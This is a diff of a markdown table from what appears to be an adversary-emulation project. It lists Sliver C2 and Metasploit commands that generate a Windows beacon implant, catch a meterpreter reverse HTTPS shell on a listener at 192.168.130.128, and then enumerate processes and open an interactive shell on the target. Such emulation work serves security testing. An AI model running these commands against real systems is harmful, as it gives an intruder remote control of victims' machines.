@@ -95,10 +95,10 @@ Each `uuid` encompasses an `executor`, within which the `command` parameter spec
 
 | Steps        | Description	                  | Executor                 |
 |:-------------|:-------------------------------|:-------------------------|
-| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | # sliver<br>generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save<br>mtls |
-| Execution | Download&Execute the sliver implant.   | # sliver<br>sessions -i session_id |
-| Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | # sliver<br>pwd   |
-| Build meterpreter session  |Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back,so that msf establishes a shell connection with the target host. | # msfconsole<br>msf6 > use exploit/multi/handler<br>msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_https<br>msf6 exploit(multi/handler) > set lport 9091<br>msf6 exploit(multi/handler) > set lhost 192.168.130.128<br>msf6 exploit(multi/handler) > exploit -j -z<br> sliver (BOLD_MUSCULATURE) > msf --lhost 192.168.130.128 -l 9091<br>msf6 exploit(multi/handler) > sessions 1 |
+| Implant Generation | Sliver generates implant for Windows platform and enables mtls monitoring. | # sliver<br>> generate beacon --arch amd64 --os  windows --mtls 192.168.130.128 --save<br>> mtls |
+| Execution | Download&Execute the sliver implant.   | # sliver<br>> sessions -i session_id |
+| Directory Disclosure | The pwd command in a Sliver session prints the current working directory of the active session. | # sliver<br>> pwd   |
+| Build meterpreter session  |Use sliver and msf linkage, msf starts monitoring, sliver bounces a shell back,so that msf establishes a shell connection with the target host. | # msfconsole<br>> use exploit/multi/handler<br>> set payload windows/x64/meterpreter_reverse_https<br>> set lport 9091<br>> set lhost 192.168.130.128<br>> exploit -j -z<br> # sliver<br>> msf --lhost 192.168.130.128 -l 9091<br># msfconsole<br>> sessions 1 |
 | Process Enumeration | The command lists remote system processes. | #sliver<br>ps  |
 | Interactive Shell Access | Open an interactive shell on the compromised machine.   |  # sliver<br> shell |
 | User Context Verification | Simply collect the user information of the target machine. | # sliver<br>whoami   |
